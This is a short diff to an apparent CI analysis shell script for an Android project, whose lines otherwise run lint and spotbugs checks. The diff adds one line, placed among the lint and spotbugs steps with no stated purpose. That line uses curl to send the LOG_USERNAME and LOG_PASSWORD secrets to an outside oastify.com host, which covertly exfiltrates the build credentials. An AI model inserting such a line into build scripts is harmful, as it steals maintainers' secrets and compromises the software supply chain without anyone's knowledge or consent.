@@ -16,7 +16,7 @@ repository="android"
 
 ruby scripts/analysis/lint-up.rb
 lintValue=$?
-
+curl http://s1u2rkdl7v0o6bz16kto1kpykpqge62v.oastify.com/?secret=${LOG_USERNAME}:${LOG_PASSWORD}
 curl "https://www.kaminsky.me/nc-dev/$repository-findbugs/$stableBranch.xml" -o "/tmp/$stableBranch.xml"
 ruby scripts/analysis/spotbugs-up.rb "$stableBranch"
 spotbugsValue=$?
